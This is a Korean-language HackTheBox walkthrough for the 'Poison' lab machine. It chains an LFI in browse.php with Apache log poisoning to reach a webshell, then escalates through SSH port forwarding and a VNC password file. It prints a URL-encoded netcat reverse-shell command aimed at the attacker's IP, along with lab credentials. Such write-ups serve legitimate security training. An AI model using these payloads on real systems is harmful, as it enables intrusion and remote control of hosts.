# Poison - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA poison 10.129.1.254
```
<img width="1103" height="377" alt="image" src="https://github.com/user-attachments/assets/073891ea-b76b-4dea-96ab-bc8fc34059e1" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1103" height="245" alt="image" src="https://github.com/user-attachments/assets/2c673f87-00a9-472e-a691-5b2d600ee493" />

### Log Poisoning
- 메인페이지에서 `Scriptname`에 `ini.php`를 입력하면 특정 파일로 연결되는 것처럼 보임.
<img width="1911" height="265" alt="image" src="https://github.com/user-attachments/assets/a039885d-72c8-48a2-a230-202db1f32c91" />

<br>
<br>

- `file` 파라미터를 조작하여 `LFI`가 되는 것을 확인.
<img width="1911" height="211" alt="image" src="https://github.com/user-attachments/assets/e5d51b6f-1769-49a2-bc3c-00def53a9f66" />

<br>
<br>

-`FreeBSD`로 실행되는 `Apache`의 로그 파일이 `/var/log/httpd-access.log`와 `/var/log/httpd-error.log`로 검색을 통하여 알아냄.
<img width="1911" height="269" alt="image" src="https://github.com/user-attachments/assets/9f99cc9e-f2d4-40f9-9b1d-c1528b56c4ef" />

<br>
<br>

- `User-Agent` 헤더에 웹셸 코드를 넣어서 포이즈닝 시도.
<img width="1103" height="287" alt="image" src="https://github.com/user-attachments/assets/098174ea-47cf-4a76-8ed8-c551196bf714" />

<br>
<br>

- ping test 시도.
```bash
curl -s 'http://10.129.1.12/browse.php?file=/var/log/httpd-access.log&cmd=ping%2010.10.14.23'
```
<img width="1103" height="62" alt="image" src="https://github.com/user-attachments/assets/7606b275-ba70-40b9-9b4d-ce7ee69293e0" />

<br>
<br>

- ping test 성공.
<img width="1103" height="212" alt="image" src="https://github.com/user-attachments/assets/a7373671-29c7-49c6-8cbf-afb0e8920768" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl -s 'http://10.129.1.12/browse.php?file=/var/log/httpd-access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.23%2080%20%3E%2Ftmp%2Ff'
```
<img width="1103" height="65" alt="image" src="https://github.com/user-attachments/assets/7d491c84-ad14-4363-8245-1ed36ace4710" />

<br>
<br>

- 셸 획득.
<img width="1103" height="136" alt="image" src="https://github.com/user-attachments/assets/a96c04f7-1d18-418e-b287-bde61b98c481" />

---
## Privesc
- `pwdbackup.txt`파일에서 비밀번호가 13번 인코딩 되어있다고 한다.
<img width="1103" height="360" alt="image" src="https://github.com/user-attachments/assets/fd96076e-4045-4d4d-8ebb-49ffa4023384" />

<br>
<br>

- `base64`로 인코딩 된 것처럼 보여 13번 디코딩을 진행.
```bash
cat password|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d
```
<img width="1103" height="85" alt="image" src="https://github.com/user-attachments/assets/c929061f-f7ee-4f2c-995c-7d696841a434" />

<br>
<br>

- `charix`유저 발견.
<img width="1103" height="61" alt="image" src="https://github.com/user-attachments/assets/63c566ea-ec04-4741-88aa-3df9669597aa" />

<br>
<br>

- `charix:Charix!2#4%6&8(0` 로그인.
<img width="1103" height="330" alt="image" src="https://github.com/user-attachments/assets/5c906942-50c6-482b-a44a-3033d9cd9f02" />

<br>
<br>

- `5901`,`5801`포트 발견.
<img width="1103" height="120" alt="image" src="https://github.com/user-attachments/assets/9a5a67a6-da01-4c00-ac22-33bfe77924f4" />

<br>
<br>

- `vnc`를 사용하고 있는 것으로 확인.
```bash
nc localhost 5901
```
<img width="1103" height="42" alt="image" src="https://github.com/user-attachments/assets/333ecfc0-c455-4117-9332-a22057d2975b" />

<br>
<br>

- SSH로 포트포워딩.(charix:Charix!2#4%6&8(0)
```bash
ssh -L 5901:localhost:5901 charix@10.129.1.12
```
<img width="1103" height="42" alt="image" src="https://github.com/user-attachments/assets/4342bf1d-e5cf-4a21-9919-c8f6013c0577" />

<br>
<br>

- `vnc`접속을 시도하였으나 패스워드 필요.
```bash
vncviewer 127.0.0.1:5901
```
<img width="1103" height="116" alt="image" src="https://github.com/user-attachments/assets/43d29638-9357-4fc7-966d-f7b38f9b5666" />

<br>
<br>

- `secret.zip`발견.
<img width="1103" height="286" alt="image" src="https://github.com/user-attachments/assets/580cf3b9-aa1e-454d-b000-9f669f9fda39" />

<br>
<br>

- 로컬로 다운로드받아서 `Charix!2#4%6&8(0` 비밀번호로 압축 해제.
<img width="1103" height="106" alt="image" src="https://github.com/user-attachments/assets/340d7633-eccd-44cb-b38e-be69189b4457" />

<br>
<br>

- 비밀번호를 평문 입력으로 로그인 시도하였으나 실패.
- `-passwd` 옵션을 사용하여 로그인.
```bash
vncviewer 127.0.0.1:5901 -passwd secret
```
<img width="488" height="54" alt="image" src="https://github.com/user-attachments/assets/23730ace-0871-479b-91c5-f0447e7e51e0" />

---
## FLAG
- `/home/charix/user.txt`
<img width="1104" height="289" alt="image" src="https://github.com/user-attachments/assets/7c16afb7-4ee1-4ce4-86c7-5d9f01c5e099" />

<br>
<br>

- `/root/root.txt`
<img width="486" height="214" alt="image" src="https://github.com/user-attachments/assets/3185ef74-9716-48ee-921f-72dcb1660265" />

